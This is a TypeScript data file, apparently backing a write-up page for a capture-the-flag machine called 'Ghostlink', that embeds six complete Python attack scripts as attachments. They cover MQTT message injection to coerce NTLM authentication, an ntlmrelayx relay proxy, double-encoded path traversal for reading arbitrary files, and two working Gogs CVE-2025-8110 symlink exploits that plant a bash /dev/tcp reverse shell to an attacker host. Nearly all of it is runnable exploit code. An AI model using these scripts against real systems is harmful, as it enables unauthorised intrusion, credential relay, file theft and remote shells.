import type { AttachedFile } from "@/components/cyber/CodeExplorer";

export const mqttTriggerCode = `#!/usr/bin/env python3
"""Ghostlink MQTT helper - read/publish the secureshare healthcheck topic
to coerce NTLM authentication from the health-check worker."""
import sys, json, time
import paho.mqtt.client as mqtt

BROKER = "10.129.62.59"
PORT = 1883
TOPIC = "GhostProtocolZero/systems/node/secureshare/healthcheck"

def build_payload(target_url):
    """Build a healthcheck telemetry payload pointing the URL at our box."""
    msg = {
        "timestamp": "2026-08-13-13:00:00",
        "node": "node-6",
        "telemetry": {
            "healthy": True,
            "url": target_url,
            "lastCheckSecAgo": 1,
            "responseCode": "200",
            "ip": "172.16.20.10",
        },
    }
    return json.dumps(msg)

def publish(url, retain=True):
    c = mqtt.Client()
    c.connect(BROKER, PORT, 60)
    c.loop_start()
    payload = build_payload(url)
    c.publish(TOPIC, payload, qos=1, retain=retain)
    time.sleep(1)
    c.loop_stop()
    c.disconnect()
    print(f"[+] published to {TOPIC}: {payload}")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://10.10.15.187/"
    publish(url)
`;

export const relayBridgeCode = `#!/usr/bin/env python3
"""Ghostlink relay bridge — custom ntlmrelayx HTTP attack.

Instead of the SOCKS plugin (which reads the raw socket and desyncs on
keep-alive reuse), this attack hands the authenticated HTTP connection to a
tiny local HTTP proxy. Every request to the proxy is serialized through the
relayed connection using http.client's proper request/getresponse cycle, so
we can browse / download files as the relayed service account without the
response-stream getting corrupted.

Place this file in impacket's ntlmrelayx/attacks/ directory so ntlmrelayx
auto-loads it, then run ntlmrelayx WITHOUT \`-socks\`:

    ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 \\
        --no-smb-server --no-rdp-server --no-mssql-server --no-rpc-server \\
        --keep-relaying

and point curl at http://127.0.0.1:18080/<path>.
"""
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.sccmpoliciesattack import SCCMPoliciesAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.sccmdpattack import SCCMDPAttack

PROTOCOL_ATTACK_CLASS = "HTTPAttack"

BRIDGE_HOST = "127.0.0.1"
BRIDGE_PORT = 18080

# Namespaced globals (avoid clashing with impacket internals)
_gate = threading.Lock()
_live_conn = None      # most recent relayed HTTPConnection
_bridge_running = False


class HTTPAttack(ProtocolAttack, ADCSAttack, SCCMPoliciesAttack, SCCMDPAttack):
    PLUGIN_NAMES = ["HTTP", "HTTPS"]

    def run(self):
        if self.config.isADCSAttack:
            ADCSAttack._run(self)
            return
        if self.config.isSCCMPoliciesAttack:
            SCCMPoliciesAttack._run(self)
            return
        if self.config.isSCCMDPAttack:
            SCCMDPAttack._run(self)
            return

        global _live_conn, _bridge_running
        with _gate:
            _live_conn = self.client  # self.client is the HTTPConnection
            if not _bridge_running:
                _bridge_running = True
                threading.Thread(target=_run_bridge, daemon=True).start()
        LOG.info("[*] relay bridge: authenticated connection registered (proxy on %s:%d)",
                 BRIDGE_HOST, BRIDGE_PORT)


def _run_bridge():
    class _RelayHandler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def _forward(self):
            with _gate:
                conn = _live_conn
            if conn is None:
                self.send_error(502, "no relayed connection available yet")
                return

            length = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(length) if length else None

            keep = {}
            for key, val in self.headers.items():
                low = key.lower()
                if low in ("host", "proxy-connection", "authorization",
                           "connection", "content-length", "accept-encoding"):
                    continue
                keep[key] = val

            try:
                with _gate:
                    conn.request(self.command, self.path, body=body, headers=keep)
                    resp = conn.getresponse()
                    data = resp.read()
                    status = resp.status
                    reason = resp.reason
                    hdrs = resp.getheaders()
            except Exception as exc:  # noqa: BLE001
                LOG.error("[!] bridge forward failed: %s", exc)
                self.send_error(502, str(exc))
                return

            self.send_response(status, reason)
            for key, val in hdrs:
                low = key.lower()
                if low in ("www-authenticate", "proxy-authenticate",
                           "transfer-encoding", "connection", "content-length"):
                    continue
                self.send_header(key, val)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            try:
                self.wfile.write(data)
            except Exception:  # noqa: BLE001
                pass

        do_GET = _forward
        do_POST = _forward
        do_PUT = _forward
        do_HEAD = _forward
        do_DELETE = _forward
        do_OPTIONS = _forward

    server = HTTPServer((BRIDGE_HOST, BRIDGE_PORT), _RelayHandler)
    LOG.info("[*] relay bridge listening on %s:%d", BRIDGE_HOST, BRIDGE_PORT)
    server.serve_forever()
`;

export const traversalFetchCode = `#!/usr/bin/env python3
"""Ghostlink traversal fetcher.

Abuses the double URL-decoding in the secureshare /api/download endpoint to
read arbitrary files on the internal host as svc_canary. The request is sent
through the local relay bridge (127.0.0.1:18080) which transparently carries
the relayed NTLM session.

Usage: python3 traversal_fetch.py <windows-path> [outfile]
"""
import sys
import urllib.parse
import urllib.request

BRIDGE = "http://127.0.0.1:18080"


def double_encode(raw_path: str) -> str:
    """URL-encode every character twice so the server's two decode passes
    collapse it back to the original traversal string."""
    once = "".join("%{:02x}".format(ord(ch)) for ch in raw_path)
    return "".join("%{:02x}".format(ord(ch)) for ch in once)


def fetch(raw_path: str):
    payload = double_encode(raw_path)
    url = BRIDGE + "/api/download/" + payload
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=60) as resp:
        return resp.status, resp.read()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    target = sys.argv[1]
    status, data = fetch(target)
    out = sys.argv[2] if len(sys.argv) > 2 else None
    if out:
        with open(out, "wb") as fh:
            fh.write(data)
        print(f"[+] {target} -> HTTP {status}, {len(data)} bytes -> {out}")
    else:
        print(f"[+] {target} -> HTTP {status}, {len(data)} bytes")
        print(data[:2000].decode("latin-1", errors="replace"))
`;

export const hiveInspectCode = `#!/usr/bin/env python3
"""Ghostlink hive inspector - dump interesting keys from ntuser.dat."""
import sys
from Registry import Registry


def main(path):
    reg = Registry.Registry(path)
    root = reg.root()

    targets = [
        r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
        r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU",
        r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths",
        r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
    ]
    for t in targets:
        print("\\n" + "=" * 70)
        print("KEY:", t)
        print("=" * 70)
        try:
            k = root.find_key(t)
        except Exception:
            print("  (not found)")
            continue
        try:
            for v in k.values():
                name = v.name()
                raw = v.raw_data()
                vt = v.value_type_str()
                if vt in ("RegSZ", "RegExpandSZ"):
                    print(f"  [{vt}] {name} = {v.value()}")
                elif vt == "RegBin":
                    try:
                        s = raw.decode("utf-16-le", errors="replace").replace("\\x00", "")
                        print(f"  [RegBin] {name} (utf16) = {s!r}")
                    except Exception:
                        print(f"  [RegBin] {name} = {len(raw)} bytes")
                else:
                    print(f"  [{vt}] {name} = {len(raw)} bytes")
        except Exception as e:
            print("  err:", e)
        try:
            for sub in k.subkeys():
                print(f"  SUBKEY: {sub.name()}")
        except Exception:
            pass


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "loot/ntuser.dat")
`;

export const gogsRceCode = `#!/usr/bin/env python3
"""Ghostlink Gogs symlink RCE (CVE-2025-8110).

Authenticated RCE against Gogs <= 0.13.3. Gogs' PutContents API validates the
path but not the destination of a symbolic link, so we commit a symlink that
points at .git/config, then write a malicious config through it. The injected
core.sshCommand is executed the next time Gogs runs a git operation over SSH.

Usage: python3 gogs_symlink_rce.py -u <url> -U <user> -P <pass> -h <lhost> -p <lport>
"""
import argparse
import base64
import os
import shutil
import subprocess
import time
from urllib.parse import urlparse

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = "[*]"


def parse_csrf(page_text):
    tag = BeautifulSoup(page_text, "html.parser").select_one("input[name=_csrf]")
    if not tag or not tag.get("value"):
        raise SystemExit("[-] could not locate CSRF token")
    return tag.get("value")


def sign_in(sess, base_url, username, password):
    """Log in and keep the authenticated session cookie."""
    csrf = parse_csrf(sess.get(f"{base_url}/user/login").text)
    resp = sess.post(
        f"{base_url}/user/login",
        data={"_csrf": csrf, "user_name": username, "password": password},
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        raise SystemExit("[-] login failed (bad credentials?)")
    print(f"{BANNER} logged in as {username}")


def obtain_token(sess, base_url):
    """Create an application token in the user's settings."""
    page = sess.get(f"{base_url}/user/settings/applications").text
    csrf = parse_csrf(page)
    resp = sess.post(
        f"{base_url}/user/settings/applications",
        data={"_csrf": csrf, "name": os.urandom(6).hex()},
        allow_redirects=True,
    )
    info = BeautifulSoup(resp.text, "html.parser").find("div", class_="ui info message")
    if not info:
        raise SystemExit("[-] could not retrieve application token")
    token = info.find("p").text.strip()
    print(f"{BANNER} application token: {token}")
    return token


def make_repo(sess, base_url, token):
    repo = os.urandom(6).hex()
    headers = {"Authorization": f"token {token}"}
    resp = sess.post(
        f"{base_url}/api/v1/user/repos",
        json={"name": repo, "auto_init": True, "readme": "Default"},
        headers=headers,
    )
    print(f"{BANNER} repo '{repo}' created (HTTP {resp.status_code})")
    return repo


def plant_symlink(base_url, username, password, repo):
    """Clone the repo, commit a symlink that targets .git/config, push it."""
    parsed = urlparse(base_url)
    workdir = f"/tmp/ghostlink-{repo}"
    if os.path.exists(workdir):
        shutil.rmtree(workdir)
    clone_url = (
        f"{parsed.scheme}://{username}:{password}@{parsed.netloc}"
        f"{parsed.path.rstrip('/')}/{username}/{repo}.git"
    )
    subprocess.run(["git", "clone", clone_url, workdir], check=True, capture_output=True)
    os.symlink(".git/config", os.path.join(workdir, "planted_link"))
    subprocess.run(["git", "add", "planted_link"], cwd=workdir, check=True)
    subprocess.run(
        ["git", "-c", "user.name=ops", "-c", "user.email=ops@ghostlink.htb",
         "commit", "-m", "plant symlink"],
        cwd=workdir, check=True, capture_output=True,
    )
    subprocess.run(["git", "push", "origin", "master"], cwd=workdir, check=True, capture_output=True)
    print(f"{BANNER} symlink planted and pushed")


def fire_payload(sess, base_url, token, username, repo, payload_config):
    """Write the malicious config through the symlink via the PutContents API."""
    url = f"{base_url}/api/v1/repos/{username}/{repo}/contents/planted_link"
    body = {"message": "config update", "content": base64.b64encode(payload_config.encode()).decode()}
    headers = {"Authorization": f"token {token}"}
    try:
        sess.put(url, json=body, headers=headers, timeout=8)
    except requests.exceptions.ReadTimeout:
        pass  # server may hang while the shell fires
    print(f"{BANNER} payload written, check the listener")


def build_payload_config(shell_cmd, repo):
    return (
        "[core]\\n"
        "\\trepositoryformatversion = 0\\n"
        "\\tfilemode = true\\n"
        "\\tbare = false\\n"
        "\\tlogallrefupdates = true\\n"
        "\\tignorecase = true\\n"
        "\\tprecomposeunicode = true\\n"
        f"\\tsshCommand = {shell_cmd}\\n"
        '[remote "origin"]\\n'
        f"\\turl = git@localhost:gogs/{repo}.git\\n"
        "\\tfetch = +refs/heads/*:refs/remotes/origin/*\\n"
        '[branch "master"]\\n'
        "\\tremote = origin\\n"
        "\\tmerge = refs/heads/master\\n"
    )


def main():
    ap = argparse.ArgumentParser(description="Gogs CVE-2025-8110 symlink RCE")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-U", "--username", required=True)
    ap.add_argument("-P", "--password", required=True)
    ap.add_argument("-H", "--lhost", required=True)
    ap.add_argument("-p", "--lport", required=True)
    args = ap.parse_args()

    sess = requests.Session()
    sess.verify = False

    sign_in(sess, args.url, args.username, args.password)
    token = obtain_token(sess, args.url)
    repo = make_repo(sess, args.url, token)
    plant_symlink(args.url, args.username, args.password, repo)

    shell = f"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1' #"
    payload_config = build_payload_config(shell, repo)
    time.sleep(1)
    fire_payload(sess, args.url, token, args.username, repo, payload_config)


if __name__ == "__main__":
    main()
`;

export const cve2025RefCode = `#!/usr/bin/env python3

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse
import base64
from bs4 import BeautifulSoup
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

"""Exploit script for CVE-2025-8110 in Gogs."""

__author__ = "zAbuQasem"
__Linkedin__ = "https://www.linkedin.com/in/zeyad-abulaban/"

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}


def register(session, base_url, username, password):
    """Register a new user."""
    register_url = f"{base_url}/user/sign_up"
    resp = session.get(register_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    register_data = {
        "_csrf": csrf,
        "user_name": username,
        "email": "zAbuQasem@attacker.com",
        "password": password,
        "retype": password,
    }
    resp = session.post(
        register_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=register_data,
        allow_redirects=True,
    )
    if "Username has already been taken." in resp.text:
        pass  # User already exists, continue
    elif "user/sign_up" in resp.url:
        console.print(f"[bold red]Registration failed: {resp.status_code}[/bold red]")
        raise ValueError("Registration failed")
    console.print("[bold green][+] Registered successfully[/bold green]")
    return session.cookies


def login(session, base_url, username, password):
    """Authenticate and retrieve CSRF token + session cookie."""
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(
        login_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login_data,
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        console.print(f"[bold red]Authentication failed: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Authenticated successfully[/bold green]")
    return session.cookies


def get_application_token(session, base_url):
    """Retrieve application token from settings."""
    settings_url = f"{base_url}/user/settings/applications"
    # First GET to fetch the page (and CSRF hidden field) before POSTing
    get_resp = session.get(settings_url, allow_redirects=True)
    csrf = extract_csrf(get_resp.text)

    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(settings_url, data=data, allow_redirects=True)
    console.print(f"[blue]Token generation status: {resp.status_code}[/blue]")
    soup = BeautifulSoup(resp.text, "html.parser")
    token_div = soup.find("div", class_="ui info message")
    if not token_div:
        raise ValueError("Application token not found")
    token = token_div.find("p").text.strip()
    console.print(f"[bold green][+] Application token: {token}[/bold green]")
    return token


def create_malicious_repo(session, base_url, token):
    """Create a repository with a malicious payload."""
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "ssh": True,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    """Clone a repo, add a symlink, commit, and push it."""
    repo_dir = f"/tmp/{repo_name}"

    parsed_url = urlparse(base_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        raise ValueError("Base URL must include scheme (e.g., http://host)")
    base_path = parsed_url.path.rstrip("/")

    clone_cmd = [
        "git",
        "clone",
        f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}"
        f"{base_path}/{username}/{repo_name}.git",
        repo_dir,
    ]

    symlink_path = os.path.join(repo_dir, "malicious_link")

    try:
        # Clean up if directory already exists
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)

        # Clone repository
        subprocess.run(clone_cmd, check=True)

        # Create symlink inside the repo
        os.symlink(".git/config", symlink_path)

        # Add, commit, and push
        subprocess.run(
            ["git", "add", "malicious_link"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "commit", "-m", "Add malicious symlink"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=repo_dir,
            check=True,
        )

    except subprocess.CalledProcessError as e:
        raise ValueError(f"Git command failed: {e}") from e
    except OSError as e:
        raise ValueError(f"Filesystem operation failed: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    """Exploit CVE-2025-8110 to execute arbitrary commands."""
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    console.print("[bold green][+] Exploit sent, check your listener![/bold green]")
    session.put(api, json=data, headers=headers, timeout=5)


def extract_csrf(html_text):
    """Parse CSRF token from hidden input; fallback to cookie if present."""
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found in form response")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()
    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False
    username = "zAbuQasem"
    password = "SuperSecurePass123!"
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
    try:
        register(session, args.url, username, password)
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)
        git_config = f"""[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
	url = git@localhost:gogs/{repo_name}.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
"""
        upload_malicious_symlink(args.url, username, password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()
`;

export const ghostlinkScripts: AttachedFile[] = [
  {
    name: "mqtt_trigger.py",
    description: "Connects to anonymous MQTT broker and repoints healthcheck URL to coerce svc_canary NTLM authentication.",
    language: "python",
    code: mqttTriggerCode,
    tags: ["MQTT", "Coercion", "NTLM"],
  },
  {
    name: "relay_bridge.py",
    description: "Custom ntlmrelayx HTTP attack that serializes requests through a local proxy on 127.0.0.1:18080 to prevent socket desync.",
    language: "python",
    code: relayBridgeCode,
    tags: ["NTLM Relay", "Proxy", "Impacket"],
  },
  {
    name: "traversal_fetch.py",
    description: "Performs double URL-encoded path traversal against /api/download/ to exfiltrate arbitrary files over the relayed session.",
    language: "python",
    code: traversalFetchCode,
    tags: ["Web", "Double URL-Encoding", "Traversal"],
  },
  {
    name: "hive_inspect.py",
    description: "Parses leaked ntuser.dat registry hive to inspect RecentDocs, ComDlg32, and TypedPaths for operational files.",
    language: "python",
    code: hiveInspectCode,
    tags: ["Forensics", "Registry", "ntuser.dat"],
  },
  {
    name: "gogs_symlink_rce.py",
    description: "Automated CVE-2025-8110 exploit: authenticates as vroth, plants .git/config symlink, and overwrites core.sshCommand for reverse shell.",
    language: "python",
    code: gogsRceCode,
    tags: ["CVE-2025-8110", "Gogs", "Symlink RCE"],
  },
  {
    name: "cve2025_8110_ref.py",
    description: "Authoritative standalone Gogs CVE-2025-8110 reference exploit with registration, CSRF extraction, and rich logging.",
    language: "python",
    code: cve2025RefCode,
    tags: ["CVE-2025-8110", "Reference", "Exploit"],
  },
];
